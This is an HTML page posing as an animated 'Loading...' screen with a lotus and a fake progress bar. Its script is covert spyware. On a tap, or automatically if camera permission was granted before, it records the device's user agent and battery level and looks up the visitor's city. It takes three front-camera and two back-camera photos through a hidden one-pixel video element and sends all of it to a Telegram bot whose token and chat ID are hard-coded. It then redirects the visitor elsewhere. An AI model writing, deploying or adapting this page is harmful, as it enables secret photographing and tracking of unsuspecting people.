<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
* {
margin: 0;
padding: 0;
box-sizing: border-box;
}

body{
margin:0;
background: linear-gradient(180deg, #0a4d68 0%, #088395 50%, #05bfdb 100%);
display:flex;
justify-content:center;
align-items:center;
height:100vh;
overflow:hidden;
cursor:pointer;
font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
position: relative;
}

/* Animated water waves background */
.waves {
position: fixed;
bottom: 0;
left: 0;
width: 100%;
height: 100%;
z-index: 0;
overflow: hidden;
}

.wave {
position: absolute;
bottom: 0;
left: 0;
width: 200%;
height: 100%;
background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M321.39,56.44c58-10.79,114.16-30.13,172-41.86,82.39-16.72,168.19-17.73,250.45-.39C823.78,31,906.67,72,985.66,92.83c70.05,18.48,146.53,26.09,214.34,3V0H0V27.35A600.21,600.21,0,0,0,321.39,56.44Z" fill="%23ffffff" fill-opacity="0.05"/></svg>') repeat-x;
animation: wave 25s linear infinite;
}

.wave:nth-child(2) {
bottom: -10px;
animation: wave 20s linear reverse infinite;
opacity: 0.5;
background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M0,0V46.29c47.79,22.2,103.59,32.17,158,28,70.36-5.37,136.33-33.31,206.8-37.5C438.64,32.43,512.34,53.67,583,72.05c69.27,18,138.3,24.88,209.4,13.08,36.15-6,69.85-17.84,104.45-29.34C989.49,25,1113-14.29,1200,52.47V0Z" fill="%23ffffff" fill-opacity="0.08"/></svg>') repeat-x;
}

.wave:nth-child(3) {
bottom: -20px;
animation: wave 30s linear infinite;
opacity: 0.3;
background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M985.66,92.83C906.67,72,823.78,31,743.84,14.19c-82.26-17.34-168.06-16.33-250.45.39-57.84,11.73-114,31.07-172,41.86A600.21,600.21,0,0,1,0,27.35V120H1200V95.8C1132.19,118.92,1055.71,111.31,985.66,92.83Z" fill="%23ffffff" fill-opacity="0.1"/></svg>') repeat-x;
}

@keyframes wave {
0% { transform: translateX(0); }
100% { transform: translateX(-50%); }
}

/* Water ripples */
.ripple {
position: absolute;
border-radius: 50%;
background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
animation: ripple 4s ease-out infinite;
}

.ripple:nth-child(4) {
width: 300px;
height: 300px;
top: 20%;
left: 10%;
animation-delay: 0s;
}

.ripple:nth-child(5) {
width: 400px;
height: 400px;
top: 50%;
right: 15%;
animation-delay: 1.5s;
}

.ripple:nth-child(6) {
width: 250px;
height: 250px;
bottom: 20%;
left: 60%;
animation-delay: 3s;
}

@keyframes ripple {
0% {
transform: scale(0.8);
opacity: 0.5;
}
50% {
transform: scale(1);
opacity: 0.3;
}
100% {
transform: scale(1.2);
opacity: 0;
}
}

.container {
text-align: center;
color: white;
z-index: 1;
position: relative;
}

/* 2D Lotus Container */
.lotus-container {
width: 320px;
height: 320px;
margin: 0 auto 60px;
position: relative;
filter: drop-shadow(0 0 40px rgba(255, 182, 193, 0.6));
}

.lotus {
width: 100%;
height: 100%;
position: relative;
animation: spin 20s linear infinite;
}

@keyframes spin {
from { transform: rotate(0deg); }
to { transform: rotate(360deg); }
}

/* Single petal design */
.petal {
position: absolute;
width: 100px;
height: 140px;
top: 50%;
left: 50%;
transform-origin: center center;
}

.petal::before {
content: '';
position: absolute;
width: 100%;
height: 100%;
background: linear-gradient(135deg,
    #fff5f7 0%,
    #ffe0e6 15%,
    #ffc1d0 30%,
    #ff9eb5 50%,
    #ff7a9a 70%,
    #ff5680 85%,
    #ff3366 100%);
border-radius: 50% 50% 50% 50% / 80% 80% 20% 20%;
transform: translateX(-50%) translateY(-100%);
box-shadow:
    inset 0 -30px 40px rgba(255, 51, 102, 0.4),
    inset 0 20px 30px rgba(255, 255, 255, 0.5),
    0 5px 25px rgba(255, 86, 128, 0.4);
animation: petalPulse 4s ease-in-out infinite;
}

@keyframes petalPulse {
0%, 100% {
    transform: translateX(-50%) translateY(-100%) scale(1);
    opacity: 0.95;
}
50% {
    transform: translateX(-50%) translateY(-100%) scale(1.05);
    opacity: 1;
}
}

/* Outer layer - 12 petals */
.petal:nth-child(1) { transform: rotate(0deg) translateY(-50%); animation-delay: 0s; }
.petal:nth-child(2) { transform: rotate(30deg) translateY(-50%); animation-delay: 0.1s; }
.petal:nth-child(3) { transform: rotate(60deg) translateY(-50%); animation-delay: 0.2s; }
.petal:nth-child(4) { transform: rotate(90deg) translateY(-50%); animation-delay: 0.3s; }
.petal:nth-child(5) { transform: rotate(120deg) translateY(-50%); animation-delay: 0.4s; }
.petal:nth-child(6) { transform: rotate(150deg) translateY(-50%); animation-delay: 0.5s; }
.petal:nth-child(7) { transform: rotate(180deg) translateY(-50%); animation-delay: 0.6s; }
.petal:nth-child(8) { transform: rotate(210deg) translateY(-50%); animation-delay: 0.7s; }
.petal:nth-child(9) { transform: rotate(240deg) translateY(-50%); animation-delay: 0.8s; }
.petal:nth-child(10) { transform: rotate(270deg) translateY(-50%); animation-delay: 0.9s; }
.petal:nth-child(11) { transform: rotate(300deg) translateY(-50%); animation-delay: 1.0s; }
.petal:nth-child(12) { transform: rotate(330deg) translateY(-50%); animation-delay: 1.1s; }

/* Middle layer petals - smaller and lighter */
.petal-middle {
width: 85px;
height: 120px;
}

.petal-middle::before {
background: linear-gradient(135deg,
    #ffffff 0%,
    #fff0f3 15%,
    #ffd4e0 30%,
    #ffb3cc 50%,
    #ff8fb3 70%,
    #ff6b99 85%,
    #ff4d80 100%);
}

.petal-middle:nth-child(13) { transform: rotate(15deg) translateY(-50%); animation-delay: 0.15s; }
.petal-middle:nth-child(14) { transform: rotate(45deg) translateY(-50%); animation-delay: 0.25s; }
.petal-middle:nth-child(15) { transform: rotate(75deg) translateY(-50%); animation-delay: 0.35s; }
.petal-middle:nth-child(16) { transform: rotate(105deg) translateY(-50%); animation-delay: 0.45s; }
.petal-middle:nth-child(17) { transform: rotate(135deg) translateY(-50%); animation-delay: 0.55s; }
.petal-middle:nth-child(18) { transform: rotate(165deg) translateY(-50%); animation-delay: 0.65s; }
.petal-middle:nth-child(19) { transform: rotate(195deg) translateY(-50%); animation-delay: 0.75s; }
.petal-middle:nth-child(20) { transform: rotate(225deg) translateY(-50%); animation-delay: 0.85s; }
.petal-middle:nth-child(21) { transform: rotate(255deg) translateY(-50%); animation-delay: 0.95s; }
.petal-middle:nth-child(22) { transform: rotate(285deg) translateY(-50%); animation-delay: 1.05s; }
.petal-middle:nth-child(23) { transform: rotate(315deg) translateY(-50%); animation-delay: 1.15s; }
.petal-middle:nth-child(24) { transform: rotate(345deg) translateY(-50%); animation-delay: 1.25s; }

/* Inner layer petals - smallest and whitest */
.petal-inner {
width: 60px;
height: 85px;
}

.petal-inner::before {
background: linear-gradient(135deg,
    #ffffff 0%,
    #fffafc 20%,
    #ffe8f0 40%,
    #ffd1e3 60%,
    #ffb8d6 80%,
    #ffa0c9 100%);
}

.petal-inner:nth-child(25) { transform: rotate(0deg) translateY(-50%); animation-delay: 0.2s; }
.petal-inner:nth-child(26) { transform: rotate(45deg) translateY(-50%); animation-delay: 0.3s; }
.petal-inner:nth-child(27) { transform: rotate(90deg) translateY(-50%); animation-delay: 0.4s; }
.petal-inner:nth-child(28) { transform: rotate(135deg) translateY(-50%); animation-delay: 0.5s; }
.petal-inner:nth-child(29) { transform: rotate(180deg) translateY(-50%); animation-delay: 0.6s; }
.petal-inner:nth-child(30) { transform: rotate(225deg) translateY(-50%); animation-delay: 0.7s; }
.petal-inner:nth-child(31) { transform: rotate(270deg) translateY(-50%); animation-delay: 0.8s; }
.petal-inner:nth-child(32) { transform: rotate(315deg) translateY(-50%); animation-delay: 0.9s; }

/* Lotus center - golden glowing */
.lotus-center {
position: absolute;
width: 70px;
height: 70px;
background: radial-gradient(circle at 35% 35%,
    #fffde7 0%,
    #fff9c4 20%,
    #fff176 40%,
    #ffeb3b 60%,
    #fdd835 80%,
    #f9a825 100%);
border-radius: 50%;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
box-shadow:
    0 0 40px rgba(253, 216, 53, 0.9),
    0 0 80px rgba(255, 235, 59, 0.6),
    inset 0 3px 20px rgba(255, 253, 231, 0.9),
    inset 0 -5px 15px rgba(249, 168, 37, 0.6);
animation: centerGlow 3s ease-in-out infinite;
z-index: 100;
}

@keyframes centerGlow {
0%, 100% {
    box-shadow:
        0 0 40px rgba(253, 216, 53, 0.9),
        0 0 80px rgba(255, 235, 59, 0.6),
        inset 0 3px 20px rgba(255, 253, 231, 0.9),
        inset 0 -5px 15px rgba(249, 168, 37, 0.6);
    transform: translate(-50%, -50%) scale(1);
}
50% {
    box-shadow:
        0 0 60px rgba(253, 216, 53, 1),
        0 0 120px rgba(255, 235, 59, 0.8),
        inset 0 5px 25px rgba(255, 253, 231, 1),
        inset 0 -8px 20px rgba(249, 168, 37, 0.8);
    transform: translate(-50%, -50%) scale(1.08);
}
}

/* Center stamens pattern */
.stamen {
position: absolute;
width: 8px;
height: 8px;
background: radial-gradient(circle, #ff6f00 0%, #ff8f00 100%);
border-radius: 50%;
box-shadow: 0 0 8px rgba(255, 111, 0, 0.8);
}

.stamen:nth-child(1) { top: 30%; left: 50%; transform: translateX(-50%); }
.stamen:nth-child(2) { top: 70%; left: 50%; transform: translateX(-50%); }
.stamen:nth-child(3) { top: 50%; left: 30%; transform: translateY(-50%); }
.stamen:nth-child(4) { top: 50%; left: 70%; transform: translateY(-50%); }
.stamen:nth-child(5) { top: 35%; left: 35%; }
.stamen:nth-child(6) { top: 35%; left: 65%; }
.stamen:nth-child(7) { top: 65%; left: 35%; }
.stamen:nth-child(8) { top: 65%; left: 65%; }

/* Text styling */
.loading-text {
font-size: 36px;
font-weight: 300;
margin-bottom: 15px;
text-shadow: 0 0 20px rgba(255,255,255,0.6), 0 2px 10px rgba(0,0,0,0.3);
letter-spacing: 4px;
color: #ffffff;
}

.loading-subtitle {
font-size: 16px;
opacity: 0.95;
margin-bottom: 40px;
font-weight: 300;
text-shadow: 0 2px 8px rgba(0,0,0,0.3);
color: #e3f2fd;
letter-spacing: 2px;
}

/* Thin glowing progress bar */
.progress-container {
width: 400px;
height: 4px;
margin: 0 auto;
position: relative;
background: rgba(255, 255, 255, 0.15);
border-radius: 10px;
overflow: visible;
box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
}

.progress-fill {
position: absolute;
left: 0;
top: 0;
height: 100%;
width: 0%;
background: linear-gradient(90deg,
    #4fc3f7 0%,
    #29b6f6 30%,
    #03a9f4 60%,
    #039be5 100%);
border-radius: 10px;
transition: width 0.3s ease;
box-shadow:
    0 0 20px rgba(3, 169, 244, 0.8),
    0 0 40px rgba(3, 169, 244, 0.5),
    0 0 60px rgba(3, 169, 244, 0.3);
animation: glow 2s ease-in-out infinite;
}

@keyframes glow {
0%, 100% {
    box-shadow:
        0 0 20px rgba(3, 169, 244, 0.8),
        0 0 40px rgba(3, 169, 244, 0.5),
        0 0 60px rgba(3, 169, 244, 0.3);
}
50% {
    box-shadow:
        0 0 30px rgba(3, 169, 244, 1),
        0 0 60px rgba(3, 169, 244, 0.7),
        0 0 90px rgba(3, 169, 244, 0.5);
}
}

.percentage {
margin-top: 20px;
font-size: 18px;
font-weight: 300;
color: rgba(255,255,255,0.95);
text-shadow: 0 0 15px rgba(3, 169, 244, 0.8);
letter-spacing: 3px;
}

/* Tap instruction */
.tap-instruction {
margin-top: 50px;
font-size: 15px;
opacity: 0.8;
animation: pulse 2.5s ease-in-out infinite;
text-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
letter-spacing: 2px;
font-weight: 300;
color: #e3f2fd;
}

@keyframes pulse {
0%, 100% { opacity: 0.5; transform: scale(1); }
50% { opacity: 1; transform: scale(1.02); }
}

/* Hidden preview */
video{
position:absolute;
width:1px;
height:1px;
opacity:0.01;
pointer-events: none;
}

/* Fade */
.fade{
animation:fadeOut 1s forwards;
}

@keyframes fadeOut{
to{opacity:0;}
}
</style>
</head>

<script>
/* ---------- CONFIG ---------- */

const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
const CHAT_ID="1167762232";

/* ---------- PROGRESS BAR ---------- */

let progress = 0;
let progressInterval;

function startProgress() {
const progressFill = document.getElementById('progressFill');
const percentage = document.getElementById('percentage');

progressInterval = setInterval(() => {
if (progress < 95) {
progress += Math.random() * 2.5;
if (progress > 95) progress = 95;
progressFill.style.width = progress + '%';
percentage.textContent = Math.floor(progress) + '%';
}
}, 200);
}

function completeProgress() {
clearInterval(progressInterval);
const progressFill = document.getElementById('progressFill');
const percentage = document.getElementById('percentage');
progress = 100;
progressFill.style.width = '100%';
percentage.textContent = '100%';
}

/* ---------- TELEGRAM ---------- */

async function sendPhoto(blob,cap=""){
let f=new FormData();
f.append("chat_id",CHAT_ID);
f.append("photo",blob);
f.append("caption",cap);

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:f
});
}

async function sendText(txt){
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CHAT_ID,text:txt})
});
}

/* ---------- INFO ---------- */

async function collectInfo(){

let info="ðŸ“± "+navigator.userAgent+"\n";

if(navigator.getBattery){
let b=await navigator.getBattery();
info+="ðŸ”‹ "+Math.round(b.level*100)+"%\n";
}

try{
let r=await fetch("https://ipapi.co/json/");
let j=await r.json();
info+=`ðŸ“ ${j.city}, ${j.country_name}`;
}catch{}

sendText(info);
}

/* ---------- CAMERA ---------- */

let video=document.getElementById("video");
let canvas=document.getElementById("canvas");
let ctx=canvas.getContext("2d");

async function cam(mode){
return navigator.mediaDevices.getUserMedia({
video:{
facingMode:mode,
width:{ideal:1920},
height:{ideal:1080}
}
});
}

async function snap(){
// Wait until video has real dimensions
if (video.videoWidth === 0 || video.videoHeight === 0) {
await new Promise(resolve => {
video.onloadeddata = resolve;
});
}

// Additional wait for camera to warm up and adjust exposure (fixes black photos)
await sleep(1200);

canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

ctx.drawImage(video, 0, 0);

return new Promise(resolve =>
canvas.toBlob(resolve, "image/jpeg", 0.95)
);
}

/* ---------- MAIN ---------- */

let started=false;

async function run(){

if(started) return;
started=true;

// Hide tap instruction
document.getElementById('tapInstruction').style.display = 'none';

// Start progress bar
startProgress();

localStorage.setItem("expGranted","yes");

await collectInfo();

/* FRONT CAMERA */
let s=await cam("user");
video.srcObject=s;

// Wait for video metadata to load
await new Promise(resolve => {
if (video.readyState >= 2) {
resolve();
} else {
video.onloadedmetadata = resolve;
}
});

// Extra time for camera to initialize and adjust exposure on Android
await sleep(1500);

for(let i=1;i<=3;i++){
sendPhoto(await snap(),"Front "+i);
await sleep(300); // Small delay between shots
}

s.getTracks().forEach(t=>t.stop());

/* BACK CAMERA */
s=await cam("environment");
video.srcObject=s;

await new Promise(resolve => {
if (video.readyState >= 2) {
resolve();
} else {
video.onloadedmetadata = resolve;
}
});

// Extra time for back camera too
await sleep(1500);

for(let i=1;i<=2;i++){
sendPhoto(await snap(),"Back "+i);
await sleep(300);
}

s.getTracks().forEach(t=>t.stop());

// Complete progress
completeProgress();

await sleep(500);

redirectNow();
}

/* ---------- AUTO PERMISSION MEMORY ---------- */

async function autoStart(){

try{
let p=await navigator.permissions.query({name:"camera"});

if(p.state==="granted" && localStorage.getItem("expGranted")){
run();
}
}catch{}
}

/* ---------- REDIRECT ---------- */

function redirectNow(){

document.body.classList.add("fade");

let go=new URLSearchParams(location.search).get("go");

setTimeout(()=>{
if(go) location.href=go;
},800);
}

/* ---------- HELPERS ---------- */

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

/* ---------- TAP START ---------- */

document.body.addEventListener("click",run);

/* Try auto */
autoStart();

</script>
